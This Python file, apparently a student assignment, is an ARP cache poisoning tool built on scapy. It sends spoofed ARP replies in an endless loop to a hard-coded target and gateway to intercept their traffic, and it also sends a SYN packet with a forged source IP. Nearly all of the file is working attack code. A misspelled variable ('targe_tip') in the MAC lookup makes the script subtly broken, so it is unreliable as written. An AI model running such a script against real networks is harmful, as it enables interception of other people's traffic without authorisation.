"""
Luyckx Marco 496283
Bouhnine Ayoub 500048

ARP cache poisoning

This script will try to poison the ARP cache of the target machine and the gateway. For more information, see the README.md file.

Usage : python3 main.py
"""

from scapy.all import *


def get_mac(target_ip):
    """Get the MAC address of the target machine"""
    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targe_tip)
    target_mac = srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac


def spoof_arp_cache(target_ip, target_mac, source_ip):
    """Spoof the ARP cache of the target machine"""
    spoofed = ARP(op=2, pdst=target_ip, psrc=source_ip, hwdst=target_mac)
    send(spoofed, verbose=False)


def craft_packet_target_ip(host_ip, target_ip):
    """Craft a packet with a spoofed source IP address to send to the target machine"""
    ip = IP(dst=host_ip, src=target_ip)
    tcp = TCP(dport=80, sport=RandShort(), flags="S") # flag "S" indicates the type SYN
    packet = ip / tcp
    send(packet)


def main():
    host_ip = "10.12.0.10"
    target_ip = "10.1.0.3"
    gateway_ip = "10.1.0.1"

    # Send a packet to the target to make sure it is in the ARP cache
    craft_packet_target_ip(host_ip, target_ip)

    try:
        target_mac = get_mac(target_ip)
        print("Target MAC", target_mac)
    except:
        print("Target machine did not respond to ARP broadcast")
        return

    try:
        gateway_mac = get_mac(gateway_ip)
        print("Gateway MAC:", gateway_mac)
    except:
        print("Gateway is unreachable")
        return
    try:
        print("Sending spoofed ARP responses")
        while True:
            spoof_arp_cache(target_ip, target_mac, gateway_ip)
            spoof_arp_cache(gateway_ip, gateway_mac, target_ip)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        return


if __name__ == "__main__":
    main()
